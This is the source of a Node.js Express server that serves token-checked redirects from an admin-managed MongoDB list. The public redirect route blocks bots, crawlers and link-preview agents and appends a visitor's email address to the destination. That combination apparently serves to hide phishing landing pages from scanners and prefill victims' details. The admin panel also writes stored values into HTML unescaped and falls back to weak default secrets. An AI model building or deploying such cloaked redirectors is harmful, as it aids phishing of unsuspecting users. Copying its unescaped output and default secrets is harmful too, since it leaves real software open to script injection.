require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const db = require('./db'); // MongoDB-based redirect storage

const app = express();
const PORT = process.env.PORT || 3000;

const JWT_SECRET = process.env.JWT_SECRET || 'your_strong_secret_key';

// Middleware
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Session middleware
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret123',
  resave: false,
  saveUninitialized: true
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  message: 'Too many requests. Please try again later.'
});
app.use(limiter);

// Auth middleware
function authMiddleware(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  return res.redirect('/login');
}

// Admin login
app.get('/login', (req, res) => {
  res.send(`
    <h1>Login</h1>
    <form method="POST" action="/login">
      <input name="username" placeholder="Username" required />
      <input name="password" type="password" placeholder="Password" required />
      <button>Login</button>
    </form>
  `);
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
    req.session.isAdmin = true;
    res.redirect('/admin');
  } else {
    res.send('Invalid credentials');
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login'));
});

// Admin panel
app.get('/admin', authMiddleware, async (req, res) => {
  const redirects = await db.getAllRedirects();
  const listItems = redirects.map(r => `
    <li>
      <strong>${r.key}</strong> → ${r.destination}
      <form method="POST" action="/admin/delete" style="display:inline;">
        <input type="hidden" name="key" value="${r.key}" />
        <button>Delete</button>
      </form>
      <form method="POST" action="/admin/edit" style="display:inline;">
        <input type="hidden" name="original" value="${r.key}" />
        <input name="from" value="${r.key}" style="width:100px" />
        <input name="to" value="${r.destination}" style="width:200px" />
        <button>Update</button>
      </form>
    </li>
  `).join('');

  res.send(`
    <h1>Admin Panel</h1>
    <ul>${listItems}</ul>

    <h2>Add Redirect</h2>
    <form method="POST" action="/admin/add">
      <input name="from" placeholder="/path" required />
      <input name="to" placeholder="https://destination.com" required />
      <button>Add</button>
    </form>

    <a href="/logout">Logout</a>
  `);
});

app.post('/admin/add', authMiddleware, async (req, res) => {
  const { from, to } = req.body;
  const token = jwt.sign({ key: from }, JWT_SECRET);
  db.addRedirect(from, to, token, (err) => {
    if (err) console.error('Add error:', err);
    res.redirect('/admin');
  });
});

app.post('/admin/delete', authMiddleware, (req, res) => {
  db.deleteRedirect(req.body.key, (err) => {
    if (err) console.error('Delete error:', err);
    res.redirect('/admin');
  });
});

app.post('/admin/edit', authMiddleware, (req, res) => {
  const { original, from, to } = req.body;
  db.updateRedirect(original, from, to, (err) => {
    if (err) console.error('Update error:', err);
    res.redirect('/admin');
  });
});

// Secure redirect endpoint
app.get('/:key/:token', (req, res) => {
  const { key, token } = req.params;
  const email = req.query.email || null;
  const userAgent = req.headers['user-agent'] || '';

  if (/bot|crawl|spider|preview/i.test(userAgent)) {
    return res.status(403).send('Access denied.');
  }

  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).send('Invalid email format.');
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    db.getRedirect(key, (err, row) => {
      if (err) return res.status(500).send('Server error.');
      if (!row || row.token !== token) return res.status(403).send('Invalid token.');

      let destination = row.destination;
      if (email) {
        destination += destination.endsWith('/') ? email : `/${email}`;
      }
      res.redirect(destination);
    });
  } catch (err) {
    res.status(403).send('Invalid or expired token.');
  }
});

app.use((req, res) => {
  res.status(404).send('Error: Invalid request.');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
